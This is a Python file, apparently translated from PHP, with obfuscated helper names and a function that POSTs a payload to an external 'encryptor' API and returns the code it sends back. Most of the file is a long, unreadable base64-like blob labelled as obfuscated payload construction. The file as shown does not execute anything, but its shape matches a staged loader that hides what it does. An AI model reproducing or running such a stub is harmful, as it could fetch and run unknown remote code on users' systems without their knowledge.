import json
import base64
import hashlib
import urllib.request
import urllib.error
import os
from typing import Dict, Any

def _vcgehlul(a: str, b: str) -> str:
    """Concatenation function (PHP _vcgehlul)"""
    return a + b

def _jgdrplxm(val: Any) -> bool:
    """Check if not empty (PHP _jgdrplxm)"""
    return bool(val)

def _dnmxhumc(payload: Dict[str, str]) -> str:
    """Make POST request to remote encryptor API (PHP _dnmxhumc)"""
    url = "https://php-encryptor.vercel.app/api/run"
    
    data = json.dumps(payload).encode('utf-8')
    
    req = urllib.request.Request(
        url,
        data=data,
        method='POST',
        headers={
            'Content-Type': 'application/json',
        }
    )
    
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            result = response.read().decode('utf-8')
    except (urllib.error.URLError, urllib.error.HTTPError):
        print("Request failed")
        exit(1)
    
    try:
        decoded = json.loads(result)
    except json.JSONDecodeError:
        print("Invalid JSON response")
        exit(1)
    
    if not _jgdrplxm(decoded.get("code")):
        print("Invalid code in response")
        exit(1)
    
    return decoded["code"]


# === Obfuscated payload construction (translated from PHP) ===

# Large base64-like strings (kept as-is for fidelity)
rqhpcko1 = "OpOSCz aqBXm1Izd aORyz2cYMffk0pa8eSiy uqYpPqZ6cheV8C92N9GRo9RlbKZqdiszxWDEF rxUIbmpbD90xiWpTFPHG68Zb+JL o8+A7hYrgmSiRN8BrXgnqp0LiAfgW71CLoH qgcLi9UXcXyTV4A6n/cgrV3VGw63uB1ozaaOwXEp4 mqn1fQm49lgyWDX4S/zf9Aev2F6HhENHQ6gsIg8vL9lHpy97LPX+RYT2fuPNTHb3TkoPIAxakEIZfmqGh94txgKdLEKbFUiIo1/ms5ZeKjImCKoW+pgUwvwTrgaecF01W4K8PEskqujBq7i6ahht/2jHprnswZ Pv5bFwcIutj2HQkTzCu/ZKneFJXLDyokb5kD8lgM3rrObrvKBbtc0GrUYp+Ark cFu/k33KI4OqBJJS6QxrC7Mft4lxB4Ej/900KAjS+XxEyxV3m4GsrZ95i/tPuKys0AaAcvQGuLZa+kRq8T7VcQcLScsMblJKCk3aBsYQEwPgGCEGsQrYiH55hTaUi60iyIavLlp+pJcloU2ixLfEviNejj0vSc/niFyk57S3ifjSs33Y20I6qSNWtWkT2TY4mD/w1n0A404FVZqzFcvqhPrhIOoj+ jjdQxFUc+M Iz+cjcm/1cAN8v2UADMfSJJd9SD5sGCBba7sNw49SGHcr401oWzYKqr6R3dLaMI1WHm6c45SRHuSs68yFxYmaQX1oDAEdo7ltIOSnoczCCQT/Fjoq6txpNLdApYyUAsiCQx11nz1t6ni2aY MxnR1rLnzqRd6U5vHc8Gj4l1UFUN7aFUe90Mj/MbICfxlt/rgG9+ogcw4I0QKJi+I381BQuwS/JtLo7nRenZqg3kM84V7qGLkWp/FTn1I7CTE qGie47 7HoFA2ODSt79Dw+eOXXCiJipcAO34Y823BXYVzBAVisXVBkUHIREJngPUJ RbLe8CJpmpiCR4mV2hwGv+pl4ZlXV NBLWavqLRWDLJ3659pceSJrcfKSSFTO7qcVxNOCyANsOFx1yCeBIxN3QITNW2jlp8GOHs3/JMwJYPz+YOpK2mnRr7Ib/wkm2FfNam70zO+wp6SyyueKW PahT16oVPhYxgMhKKVYhkiZ0RJyI8GF7FsdoNIYimd/Wgf/KAC6NGtr6jmr99l5jjT4PdRAEMWGBnjbIDh3FSx/pUNSN GWIshnvmVeimlOVjQWDfvQWWCtAfF0NIziPeXAFb3dMOHrdeizD4HSM GHaycaX8I0e9kE5k85Mdf6EYIYG72ttTNYTw+LzPLXqw8u5xSIC9nsoKICL8F56ekJ7K7/pnG9eVavWbN6p8rsOYxUVhaJ1ff4Qgs3GLQtiPMpjx2lAo/+pS09GTY8vJfSne0GmHO vqhtgfMZmW+rA/cRMZFU tFKHwwGqpA6/dnmZSl4aTExa8uoxPMhld96m6vltU+0NYUVBLYe1G4RBp9IaEeZrxwijq vTWoUsqqsM4L WAC2TVb42eGj lDTP5UJtjKDSGnN7XrR5oi6N9JbC8T BnVWHgFiNLWIA2dnOGxwGugGkQ5ZTpIee3D5RL1w2prEcQ/k6FbOAtJFWdkj1XkxRIgTuMvQTM RnW2uCUN6kv3lEDc383pP5fVBR+Eod5z9hx2+0etSSooF58JVwxp8ib sneEm4Kp0Vu4euNBZNHvXQotHU5v0jdS8Yhgm+EP2lgax7JxQ1TyJ2KsmfJtN5IKzXy4+NtrS7/v5hln/q3w1Y+cGGYaXZpK82Z2COc4Xu2Op5F+rVF16PMsdXs jEA+kLE9M21s44T lvgVjs8Nk0r9JY y94kU2zFStIbcPydb lqChrKtN3I1PmBowz5PCQWJcgiOQB eWqu aT+TdXrbZy+x4DD6M GDKc7EVG0C xofgpoRoX/CyxOqOXuY4ZcuLLJvge4NdDssRawV3L4oKNoeTUF Wf9H65GGyTVZpqDH1Kgq13J8qi/nAXfI4s3dDWqWimi/sNmSWAjxMl6ZhY4Xf5mCrEpL JtQWqRoHZ/A1aq4JrYU A4Re/rpNMiXv0+w0lEQWkhATpf1A14WZqtPgEaG JCaV+IBbqGTD9UrQrvcRSWfIlc61nezSVWqqqATDwwRTxgreFKUrnfSBcIl1eQghOG06mACNH28rA/yr1g7871KOJ4oKZ18oQExpQphsjYP51DuwlDgp1cz5yiHGs4CrDe88+ IxX WKKUH Icp aBSvfGFmDa8ZJBS2d4qm9D Oda8lBe/ZE8jnPwhndk3EIMCjPVSrSGmHvISsZQ8VspMlNj0QaDbH/temp1wZtE0txJ3t5t10uRSjenp3almzmN3UTMHUZDFUF FUYxJApEbeWqFmNfw1OUwSR3lvPxN01GBaAnG/ZIAt09TrmV7cVrBqw x4dxwMa4dtvGi6Bf7IaL JjNP05jTI44iY5yGQH dxeEdLaCYqe uIScPygB bn1N0TUh8AvrCsJtuJDymBnR7d5VzteVLHw833+oMvkGo9qvNooxmojh609M fz rbdK3c9paYVcGqR2qv kMdvHhr2pUSpIs+Pb+1nNRPCr7rtAyyktTVRhCu8aZE9jnQujQ/Ej86UnOeVZqFMTdjcNSRRfhk6rf1Qn5nGjla+L+jkDqaBuDdgB/ZqKrXF7eBPWTO0zEKoDNOJzteBGaVeRPMkeZKNu5xIo77EhnBfh cLlG+9hWljG56St/ftgdqs+ibm99oASEsv4qPicOZN+fTl20kQd9+E+LOjbOBadPdoMqsH DI f7OI/EvnKIoXVoGOf1Te7QWbrBzaSxU riwqxp fkHTH9vCWaXlZgXNs+c/FGp mKxaHEsgPzK+QVAm tSdE3rBU ONFiSVeNIVJ ZCo2oGM3kSlsW4kYanLe2KIcPirv/6l/ bNKAXjTEDXqY2IgGd8gCUF2wneynKklu3tAFgXefx+tI ktyaKoBTkKVfxvE0+nV5W5VZQg/hT9i3mNOL/WzxV6aRzy2D6OXcYhJ1k8lGMWlOKj9+7mQS56/HHAIGfKiwBHYEfBvVqlrMyo32wXcS84uagjezgKL9NIyZIk7CxnU1TqYuX KSEFe60Up9jY Cs/qdV7Jk6JBu43C1AH8QguCLvd38YoqlDB GqA1k ketgJpnItD/TL privB/Cot QIQWVZ HCDjj1l08HgxmPGJDXcN1Pn8Sw7NIoa/7E7P6w0uWckQSPYZHC11k0GHKs/PsHujjLrRBwHon e+Nii6uShFE iot hkCeR M exKLvtOq+QeZ4EQHnILSMH8zR/YDqcc7K1XPWHtMtQX0g1QvvXsw dLwBGw1OOgXlSf usxS8JqgtXHaTh4/+bDn+R15iTq6OpdQaIvJm5Pn4aGHAUqxVe0WYXFF5+11tyE7l xymQWI lYSU5LmaEMbfpRtRXm6Ww4k skox4COw38sFNCkrY5llAB IJEBZ WnzM pqlz cPdCY yuJ9FEBdPFhMeU poosTFGRuHaYtpF4fduJ1uZBx8WmDVMoS0LJDOVTtb tE+qs mtf25Sli3Qh jdr1wwt0rpxv bxa8aFMjki2SxB2u2GcRx8wonhV9HFA8dWwn3MsPY/4zWPQvTFFX+ PGE R8Boc0knDEX7A erddORE WqwGidpv2He2FsHiWWlADseaQW HN+HOugNiKSlOasDD258a4h5wTrBcaS6fl1tlnO OwZn+rScnNWk0neEH7G3hv1xj1kVM9P1HTq0SWtCDQX/bwfa3DZ8b8t4GKJpQGvb9QfwX8RUvJ plns1a1JRY0u Fqv8onx3fLxCK MfeM1xCX0+vdYoA4NgkaP/6U45hSRozp102uYK YDy1N9LwWQX TkNwrkYeIQ/wxT1GBCg5Q023Ie1E/XHejoNnXCm0TySqHKHuyWszYOGMeIL61e6+89six0e7pONPAPCLMSvtYTXC/o9y4acd1sEqFLkCRe4blkYTs6gWb6sofI6spcHwUDktNqpB ao6Uz6/LEXlHilg qtaYQlMeR++67eFs3q0gqTQdyUmHdMBgtR7I3QWE9kc5wYh31lFrve CkRX5kbQQr4QyfdMXBXpHwS QSh tesWEvK6LOMed0Aj4xj9ORx+X dT08V1oPax fxwM3PO0r8BshVvXo jsYt++8jX9MVANLJhm/iv2YPik2krXt1GlncN6D2p/WTmcA6EFPBSCImwNsG6tEMI mBuS20B4caATj2DPfcveFmIo5jKH9NO0+HdLq9NE/J5rl0ayPkMIh+6Qp/FrUVuD3sAjbHWJ263aQVs dmNDqk/VA9D5LCDJcbCNVLWvivzBhGidy d45kbiR5t98BFrJxnXWQ D v07fm4/I153h9xhEFkea1U0epSz7l8peUI nKweqOQCHk4K6QCqHTcQezxodWRMBbjxn3v8+6xm8otEv9z5lpTJQn8x6XsHahZHE/11bKB3wnS5A6UY72+9dbiyB4J3D/inUpYi5AipdftTshTWH8n9Zd icb8Ss1toJEm luQj8zSvxRs2nPeJ3CD0yZU9J RlyB0uzeY/DSupcGlPOC8I77eUWlOXP1FU4AjGdZA+ Ikkjg/xfIAVONeHVK7qV5kUACmsNajrszyZ63fXvozGK+3NF1lF3xQxP1/cNrMTv2a8R+l0mjhCd4R0CE+CVcicE0/FnP BBA4NJ2gla6jtT0HrrsgySHfrPgBQD wIc0FTmbIG9VHUT+XXL93hdxT+mxHQvSewMIWsbqaoWU+BeBGVAo+3CLHXU6oZ6Z1Ku5+9SmK IkhDKLjomcG1r jPMNbx3P1FbU/4dOx1iqG5Rp uhRC27Y4sg3PYs4O3wK5ZFelEajQs528upy eo7Cdu+o2eu1sDgWEXkrtI ICOX+X7dAEME0jo4OekxR11df/DsuLm jmrF1Y4DI4nVVbP4xV2a2we+7CKKKYyULp3E7PN4s2TZ9vwNjHEza0cxjC9sTFKEVQHF1NHcDP/DYK Gn p0oJw8qGG9weW5ZbI7WteA0LbJa3GTEzuP1z9icsdGTSfR0yVBrXkHDGpf1M7sI+fYgL6bet2NE2yAXC0NHO3A0CHgGFiGJFTadNZj99N1uaudA1D1jlC4OZvMRPeuThU7jGuA+q2/K ceyVDuoYSmmq22mAWSWKI+G8naGsMaHg8qz527f07OT8ocRPbti7pc3GttwticK cjkFK7qti0G/zRKdLa+ GkdRcECtmV2SlcCc1fY ltiCyWw cqOfA03C+0IzsK5xc iPNsMG2z0PWz1ml/aAZa265Bd8Q0l02/fo+oGS4SIO1S/mcEo5H9UTcjRf2RvTkzHilHmWX6dQRm+7O91CzesXzIGreDNTuj+ FwyyLVnol2lRQC2PdxhVVA YQZM U7iSCDDEu4BlkMGYaJwGf+f3Z1AVJEJ9UmvbDQ B8uNRLTj8VvjEv5pEqsSqbTWZoz+vVRxiOi uwh6+NcHmHgkUUnXD30op6Lq3M5J6zGvhjnqb5CflEt0j1u80cBK5RRCWtSw9ImYx85ppXYIAQPvykbc z7ekvOD5X81jwsNiTJGwfPum9ALJSgfA87Vbrqaa e6cJ0hYbMiy lVpf c/Wqzs gq3uU/QxsCRhHHrFGC9799eQILWHw0/CKN7Xb/0JsyTR/h9KyrKIDP1v+y k3uaa zr5gF/3s7EpByu5qLzQHPCLUrEK1rb1M+uRN/s1Rk6lNYl264rNTrdbLbUTxhXzG vYmbAhDuR9K88+hwygG+hA WrwKh mIvh6X1ZsMIHITaJ5mjPQA44w0CHtP31hn5JH P3FGbi6djOwNpcZ+afTBzqizS0+NnKUAo03j zfkiTp10HG8mAJXWPw bdiL vdaVj4h75j0HkaLjpzKot uVhxCggNhb63qnZ9jR Pys53/CFJ9r/iiU13kf1/tmGS6TbIe+3LCedAvnjER2dAQC Kq3qHnnn91W54VYrGGI OyzmFAd28vzPV0WE0RGlXxfyUZ1RSH7td3HfZczbXUrfj8nFdNvS08yx67vCZjCs53ExO6t1KpXmB5baO45sbxtZphKjcJFadadpJKfQ8D1iiXW cibBV/78ZSrLNQH oXEY Eq2xK bkaHp8bijwV2ThxBNOvUJ Qrlwiuf a5J31Z4bswOinbKTgNcPTnnO8KeIcSd1RID8ks+W+GbDXhNQhFhKKxQN4se vZcyS6WE8BN/RsQ+/mFzkj ZPQd8B1yTEfA+4cT5Q6aAES houuJGf/yRjwfDg1AZkOS I9s59I5pf8ExEWjhFu9LYx+XOj g+YPmSK0/em1xKss0MqR Uv9u74amHdfM/EVjyA+b6wrzOsguH19v89cJ/trZESCgQ3mRF4lG yosd iS0JVuPqBG4g7ww7wf jDcgQIuZu bFpUT2A rayAn6o6LXUHrTg n/EVdkG lyxR0CoEgAG6egj98uP/mCG9Ym hvb buhWY4euiBjSNcGSH0q2lI0Mp1aTBHo59uqVE5Ew q5Z90fxCvGh6s/r+ VvQM K U rdrC1A2wu3niEBBcloyOVkHmjW8PWzma9KM65w9TMZasB5C6RVFHJy kEd+LXh2IS42yzof zcJF1TrKb2xQqbnrCOyp/Tlu8APxbqXHCq/5kisjRyDki keyLunMj6vgmas9bzLy b4+H6IqqrkfW2bP7cpi2wJpB1ribQv7KFt9gKzVk5NN2SYP9e2sjyTVP3GcCtMnq gY Vz14oOPyhW k5DbZiFjFiBhQzyW Ckv1aj4UEvt/ H8gs5VnVnUitxrha/2JBHstFYO sef3ryDVrMiIgB/U8P2Wg81Xv jexttiQ5nerpjMPyCBxTjcHZCdxRg r1iF3JJMcMJOHmFbBZ WZArn oz6YRJpShxGZ zJKwx i0RhLnesam dtsr6CwK0KOBsQu0OiqZesrPT871Qj+7Ayolz9DWkJVe uTKg6sSuKfJNF S85AV32/Y it er+oqUqLt qhQD f5TDyZK pq2M5VIbn6SVxOMpEF2pC7fpItQM5jHe9kQ8kO9CHuz+WV8Bn hLOJ PNehri/LMXRf8UgPU8Jxya6MNwVM4ycYUPssIhBfNaqDXl wl7Y V2iI/+6R4fQK O9UH y05h30m+8GYKID zK9LS pmFXm7Za96tt4aCcHzFMFI+oUtBi w9F7XJGL0Y3DMK4TSQ7rStkpXp3/DXU2ghfCKdlz mta4ewxVKn hVkxTF9/AlM9LEyEsgbYGDgCdl62qrenWXVy bZiCNayX+Bv0A13OGjW4IvHR6ztxWTOVEBz4SEday z5AH9EAZsSMEte8qU6RUMKHD P3e1YPj bnycTRrqYVgtUegbPLCnJA8ATYl m/7J48HlRKi/f0naWI832R6QLcceU6/V6R57Bjaly3aw3IXVUDUU XxqEBjITpJ5Sxr5OgDi ueQvN2WqS4wlXaIzfm2EmfXtXlPeXXfYWi2tprIYq+jgFzPX6LWRN6lI jjsEwVNtR5FtNRHatKhLfa5SUEewh2Ilq jshnTQr fDVj9TUBjPff9hUk ad8UJ3gRBCny3kzMeYeHTpzhNmHY0oeHSLtsSruSnSuCMZ+ADlFN Pz1keGEC6n9HVzah5DHziNdi7sQZwFxAVgk/ps3qUT+/6/c z0SXeTqy1Gz65SYfYT Ii yf0SODX78IvaCjh2MT+xD6m3FD8lT2jm x2apwLhDT0ROEJ HqxSHNx oPuEWK ORfUWOt+KWNu xem aD7wPyyJ9fnNtDo+92icedcBb/Rn78k5RMjreAIHIq3v6xoF HyyvGVIc0HQiVxJIn3NsMDRkNT45nEfE5ieb gv5AuQUGJlVfMaf1bI/b/y EGh4Y zwdEm ncFlA qckQM J3N5POY8pAd8B0VoEdj1z6Wp7e0pF7jc uYx2s0Wf6Jbddtfr9K8q7PtRH BVqnX GGb4/whMWF Hj g//NxtZltK JxYKHel3offgq0phJXRj91BhMRcMfOx zjO8aJ8HiyCpC0TPmY7GvCT S9FFLqXC SkX4rXoTT E3AyLJVWju z90xWTxT7xSpd9yyL dZp/GwTZyDKIBUuXsVgH3czR VEBYnen88iH SeNcbGs bO6AFy7UnO8dkQEoDh1gbC6LkDD3aqRsXQ C1lqS7Kr0l5D89JbRToOrl/EP8JPkXeNs a//gaeFt7/mH/6EDcJ7u2e0g9HkYpK++8oe+HwpVeVs fZdgJN jxM3j723S1c3hbXIBbbS+2jDM96l+Ytj4L++l2GWA+e6ac raU1yWHuqq8pRbywPLcw d5Qy5Ef//AJi09CyDEZZaAC
